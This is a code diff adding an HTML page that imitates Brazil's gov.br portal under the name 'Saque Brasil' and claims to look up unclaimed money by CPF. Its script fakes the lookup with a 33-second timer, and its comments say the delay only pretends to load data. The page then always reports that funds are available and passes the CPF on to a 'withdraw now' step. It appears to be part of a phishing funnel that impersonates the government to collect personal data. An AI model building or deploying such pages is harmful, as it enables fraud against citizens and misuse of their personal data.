@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="preload" as="image" href="../../images/govbr-logo.png">
+  <link rel="preload" as="image" href="../../images/iconenv.png">
+  <link rel="stylesheet" href="../../css/styles-DzPR7eDw.css" data-precedence="default">
+  <title>Análise — Saque Brasil</title>
+  <style>
+    html { scroll-behavior: smooth; }
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .animate-fade-in-up {
+      animation: fadeInUp 0.6s ease-out forwards;
+      opacity: 0;
+    }
+    .delay-100 { animation-delay: 100ms; }
+    .delay-200 { animation-delay: 200ms; }
+    .delay-300 { animation-delay: 300ms; }
+    
+    .hidden { display: none !important; }
+    
+    .video-container {
+      position: relative;
+      overflow: hidden;
+      border-radius: 1rem;
+      background-color: var(--brand-navy, #1e3a8a);
+      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+    }
+    .video-overlay {
+      position: absolute;
+      inset: 0;
+      z-index: 10;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 0.75rem;
+      background: linear-gradient(to bottom, rgba(30,58,138,0.8), rgba(30,58,138,0.6), rgba(30,58,138,0.8));
+      padding: 1.5rem;
+      text-align: center;
+      cursor: pointer;
+    }
+    @keyframes ping-slow {
+      75%, 100% { transform: scale(1.5); opacity: 0; }
+    }
+    .animate-ping-slow { animation: ping-slow 2s cubic-bezier(0, 0, 0.2, 1) infinite; }
+  </style>
+</head>
+<body class="antialiased overflow-x-hidden">
+  <div class="flex min-h-screen flex-col bg-background font-sans">
+    
+    <!-- Header Fixo -->
+    <div class="sticky top-0 z-30 bg-card/95 shadow-[var(--shadow-card)] backdrop-blur">
+      <header>
+        <div class="mx-auto flex h-14 max-w-2xl items-center justify-between gap-3 px-4">
+          <img src="../../images/govbr-logo.png" alt="gov.br" class="h-6 w-auto shrink-0 select-none" draggable="false">
+          <div class="flex items-center gap-3 text-brand-blue">
+            <button type="button" aria-label="Mais opções" class="shrink-0">
+              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-5"><circle cx="12" cy="12" r="1"></circle><circle cx="12" cy="5" r="1"></circle><circle cx="12" cy="19" r="1"></circle></svg>
+            </button>
+            <button type="button" aria-label="Cookies" class="shrink-0">
+              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-5"><path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5"></path><path d="M8.5 8.5v.01"></path><path d="M16 15.5v.01"></path><path d="M12 12v.01"></path><path d="M11 17v.01"></path><path d="M7 14v.01"></path></svg>
+            </button>
+            <button type="button" aria-label="Aplicativos" class="shrink-0">
+              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-5"><rect width="7" height="7" x="3" y="3" rx="1"></rect><rect width="7" height="7" x="14" y="3" rx="1"></rect><rect width="7" height="7" x="14" y="14" rx="1"></rect><rect width="7" height="7" x="3" y="14" rx="1"></rect></svg>
+            </button>
+            <button type="button" aria-label="Conta" class="flex items-center gap-1.5 rounded-full bg-brand-blue px-3 py-1.5 text-sm font-semibold text-primary-foreground shadow-sm uppercase tracking-wide">
+              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-user size-4" aria-hidden="true"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+              <span id="header-user-name">ENTRAR</span>
+            </button>
+          </div>
+        </div>
+      </header>
+      <div class="h-px w-full bg-gradient-to-r from-transparent via-brand-blue/30 to-transparent"></div>
+      
+      <!-- Breadcrumbs -->
+      <div class="mx-auto flex max-w-2xl items-center gap-3 px-4 py-2.5">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-search size-5 shrink-0 text-brand-navy" aria-hidden="true"><circle cx="11" cy="11" r="8"></circle><path d="m21 21-4.3-4.3"></path></svg>
+        <nav aria-label="Trilha de navegação" class="min-w-0 flex-1">
+          <ol class="flex items-center gap-1.5 truncate text-[13px] text-brand-navy sm:text-sm">
+            <li class="truncate">Benefício</li>
+            <li aria-hidden="true">›</li>
+            <li class="truncate">Valores a Receber</li>
+            <li aria-hidden="true">›</li>
+            <li aria-current="page" class="truncate font-semibold">Análise</li>
+          </ol>
+        </nav>
+      </div>
+    </div>
+
+    <!-- Main Content -->
+    <main class="mx-auto flex w-full max-w-2xl flex-1 flex-col px-4 pb-10 pt-4">
+      
+      <!-- Alerta Sucesso (Escondido inicialmente) -->
+      <div id="success-banner" class="order-2 mt-6 rounded-2xl bg-gradient-to-br from-brand-blue to-brand-green px-6 py-10 text-center shadow-[var(--shadow-card)] hidden animate-fade-in-up">
+        <h1 class="text-2xl font-extrabold leading-snug text-primary-foreground sm:text-3xl">Foram localizados valores disponíveis para resgate!</h1>
+        <p class="mt-3 text-base font-medium text-primary-foreground/90">Clique no botão abaixo para efetuar o saque.</p>
+      </div>
+
+      <!-- Area do Vídeo -->
+      <div class="order-1" id="video-section">
+        <div class="mb-3 rounded-lg border border-brand-blue/20 bg-brand-blue/5 px-3 py-2.5">
+          <p class="text-center text-sm leading-snug text-brand-navy">
+            <span class="font-semibold">Enquanto consultamos valores disponíveis no seu CPF,</span>
+            assista à reportagem para entender o caso.
+          </p>
+        </div>
+        
+        <div class="video-container">
+          <video id="report-video" src="../../images/reportagem.mp4" playsinline preload="metadata" autoplay muted class="block aspect-video w-full object-cover"></video>
+          
+          <div id="video-overlay" class="video-overlay">
+            <img src="../../images/govbr-logo.png" alt="gov.br" class="h-7 w-auto brightness-0 invert sm:h-8">
+            <span class="relative flex size-16 items-center justify-center rounded-full bg-brand-blue shadow-lg sm:size-20">
+              <span class="absolute inset-0 animate-ping-slow rounded-full bg-brand-blue/40"></span>
+              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="relative size-7 fill-current text-primary-foreground sm:size-9"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon><path d="M15.54 8.46a5 5 0 0 1 0 7.07"></path><path d="M19.07 4.93a10 10 0 0 1 0 14.14"></path></svg>
+            </span>
+            <span class="text-lg font-extrabold uppercase leading-tight tracking-wide text-primary-foreground sm:text-2xl">Toque para ativar o som</span>
+            <span class="inline-flex items-center gap-1.5 rounded-full bg-primary-foreground/10 px-3 py-1 text-xs font-semibold text-primary-foreground/90 sm:text-sm">O vídeo já está rolando — clique para ouvir</span>
+          </div>
+        </div>
+
+        <div class="mt-2.5 flex items-center justify-center gap-1.5 rounded-lg bg-brand-blue/10 px-3 py-2" id="timer-container">
+          <span class="text-sm font-semibold text-brand-navy" id="timer-text">Calculando...</span>
+        </div>
+      </div>
+
+      <!-- Dados do Usuário -->
+      <div class="order-4 mt-4 rounded-xl border border-border bg-card p-4 shadow-[var(--shadow-card)] animate-fade-in-up delay-100">
+        <dl class="divide-y divide-border">
+          
+          <div class="flex items-center gap-3 py-3">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-5 text-brand-blue"><rect width="20" height="14" x="2" y="5" rx="2"></rect><line x1="2" x2="22" y1="10" y2="10"></line></svg>
+            <dt class="sr-only">CPF</dt>
+            <dd class="min-w-0 flex-1 truncate text-[15px] text-foreground" id="display-cpf">...</dd>
+          </div>
+
+          <div class="flex items-center gap-3 py-3">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-5 text-brand-blue"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+            <dt class="sr-only">Nome</dt>
+            <dd class="min-w-0 flex-1 truncate text-[15px] text-foreground" id="display-nome">
+              <span class="block h-4 w-40 animate-pulse rounded bg-secondary"></span>
+            </dd>
+          </div>
+
+          <div class="flex items-center gap-3 py-3">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-5 text-brand-blue"><path d="M8 2v4"></path><path d="M16 2v4"></path><rect width="18" height="18" x="3" y="4" rx="2"></rect><path d="M3 10h18"></path></svg>
+            <dt class="sr-only">Data de nascimento</dt>
+            <dd class="min-w-0 flex-1 truncate text-[15px] text-foreground" id="display-nasc">
+              <span class="block h-4 w-40 animate-pulse rounded bg-secondary"></span>
+            </dd>
+          </div>
+
+          <div class="flex items-center gap-3 py-3">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-5 text-muted-foreground"><circle cx="11" cy="11" r="8"></circle><path d="m21 21-4.3-4.3"></path></svg>
+            <dt class="sr-only">Situação</dt>
+            <dd class="min-w-0 flex-1 truncate text-[15px] text-foreground font-semibold" id="display-status">Sua consulta está em andamento...</dd>
+          </div>
+
+        </dl>
+      </div>
+
+      <!-- Botão de Ação (Aparece depois do timer) -->
+      <a href="passo3.html" id="btn-saque" class="order-3 mt-4 flex w-full animate-fade-in-up items-center justify-center rounded-xl bg-brand-blue px-6 py-4 text-lg font-bold text-primary-foreground shadow-[var(--shadow-card)] transition-opacity hover:opacity-90 hidden">
+        Efetuar Saque Agora
+      </a>
+      
+    </main>
+
+    <!-- Footer -->
+    <div class="bg-background px-4 py-4 text-center text-[11px] text-muted-foreground">
+      <p class="flex flex-wrap items-center justify-center gap-x-1 gap-y-1">
+        <a href="termos.html" class="text-brand-blue underline hover:text-brand-navy">Termos de Uso</a><span aria-hidden="true">·</span>
+        <a href="privacidade.html" class="text-brand-blue underline hover:text-brand-navy">Privacidade</a><span aria-hidden="true">·</span>
+        <a href="lgpd.html" class="text-brand-blue underline hover:text-brand-navy">LGPD</a><span aria-hidden="true">·</span>
+        <a href="cookies.html" class="text-brand-blue underline hover:text-brand-navy">Cookies</a><span aria-hidden="true">·</span>
+        <a href="contato.html" class="text-brand-blue underline hover:text-brand-navy">Contato</a>
+      </p>
+    </div>
+    <footer class="bg-brand-navy px-6 py-6 text-center animate-fade-in-up flex flex-col items-center gap-3">
+      <img src="../../images/govbr-white.png" alt="gov.br" class="h-5 w-auto opacity-90">
+      <p class="text-xs text-primary-foreground/70">&copy; 2026 &mdash; Atendimento Online</p>
+    </footer>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      let headerDados = sessionStorage.getItem('funil:dados');
+      if (headerDados) {
+        try {
+          const d = JSON.parse(headerDados);
+          if (d.NOME) {
+            const el = document.getElementById('header-user-name');
+            if (el) el.textContent = d.NOME.split(' ')[0].toUpperCase();
+          }
+        } catch(e) {}
+      }
+      // Pega CPF da URL ou sessionStorage
+      const urlParams = new URLSearchParams(window.location.search);
+      let cpf = urlParams.get('cpf');
+      if (!cpf) {
+        cpf = sessionStorage.getItem('funil:cpf');
+      }
+      
+      if (!cpf) {
+        window.location.href = 'index.html';
+        return;
+      }
+      
+      // Formata o CPF para exibição
+      function formatCPF(v) {
+        v = v.replace(/\D/g, "");
+        if (v.length > 9) return v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+        return v;
+      }
+      
+      document.getElementById('display-cpf').textContent = formatCPF(cpf);
+      
+      // Atualiza URL do botão Saque
+      document.getElementById('btn-saque').href = 'consulte/3?cpf=' + cpf.replace(/\D/g, "");
+
+      // Video lógica
+      const video = document.getElementById('report-video');
+      const overlay = document.getElementById('video-overlay');
+      
+      overlay.addEventListener('click', function() {
+        video.muted = false;
+        video.volume = 1;
+        video.currentTime = 0;
+        video.play().catch(function(e){ console.log("Auto-play prevented", e); });
+        overlay.classList.add('hidden');
+      });
+
+      // Lógica de simulação de API / Timer
+      setTimeout(function() {
+        let dadosStr = sessionStorage.getItem('funil:dados');
+        let nomeDisplay = 'MARIA DAS GRAÇAS SOUZA';
+        let nascDisplay = '12/04/1985';
+        
+        if (dadosStr) {
+          try {
+            let dados = JSON.parse(dadosStr);
+            if (dados.NOME) nomeDisplay = dados.NOME;
+            if (dados.NASC) nascDisplay = dados.NASC;
+          } catch(e) {}
+        }
+        
+        document.getElementById('display-nome').innerHTML = nomeDisplay;
+        document.getElementById('display-nasc').innerHTML = nascDisplay;
+      }, 1500); // Demora 1.5s pra "carregar" os dados da pessoa
+      
+      // Timer do Botão (33 segundos)
+      let timeLeft = 33;
+      const timerText = document.getElementById('timer-text');
+      const btnSaque = document.getElementById('btn-saque');
+      const successBanner = document.getElementById('success-banner');
+      const statusText = document.getElementById('display-status');
+      const videoSection = document.getElementById('video-section');
+      
+      const interval = setInterval(function() {
+        timeLeft--;
+        if (timeLeft <= 0) {
+          clearInterval(interval);
+          timerText.textContent = "Liberando...";
+          
+          setTimeout(function() {
+            // Remove o timer e mostra o botão
+            document.getElementById('timer-container').classList.add('hidden');
+            
+            btnSaque.classList.remove('hidden');
+            successBanner.classList.remove('hidden');
+            statusText.textContent = "Saque liberado.";
+            statusText.classList.remove('text-muted-foreground');
+            statusText.classList.add('text-brand-green');
+          }, 1000);
+        } else {
+          // Formata mm:ss
+          let minutes = Math.floor(timeLeft / 60);
+          let seconds = timeLeft % 60;
+          timerText.textContent = `Botão libera em ${minutes}:${seconds.toString().padStart(2, '0')}`;
+        }
+      }, 1000);
+    });
+  </script>
+</body>
+</html>
+
+
